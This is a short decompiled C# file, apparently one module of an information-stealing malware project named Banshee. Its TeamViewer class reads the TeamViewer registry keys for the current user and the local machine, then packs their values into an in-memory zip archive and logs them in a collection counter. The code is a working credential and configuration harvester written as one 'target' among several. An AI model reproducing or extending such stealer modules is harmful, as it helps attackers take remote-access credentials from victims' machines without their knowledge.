﻿using System;
using System.Collections.Generic;
using System.Linq;
using Banshee.Helper;
using Banshee.Helper.Data;
using Microsoft.Win32;

namespace Banshee.Targets.Applications
{
	// Token: 0x020000A5 RID: 165
	public class TeamViewer : ITarget
	{
		// Token: 0x060001E9 RID: 489 RVA: 0x00010720 File Offset: 0x00010720
		public void Collect(InMemoryZip zip, Counter counter)
		{
			List<string> list = new List<string>();
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\TeamViewer"))
			{
				list.AddRange(RegistryParser.ParseKey(registryKey));
			}
			using (RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\TeamViewer", false))
			{
				list.AddRange(RegistryParser.ParseKey(registryKey2));
			}
			if (list.Any<string>())
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "TeamViewer";
				string text = "TeamViewer\\Registry.txt";
				zip.AddTextFile(text, string.Join("\n", list));
				counterApplications.Files.Add("SOFTWARE\\TeamViewer => " + text);
				counterApplications.Files.Add(text);
				counter.Applications.Add(counterApplications);
			}
		}
	}
}
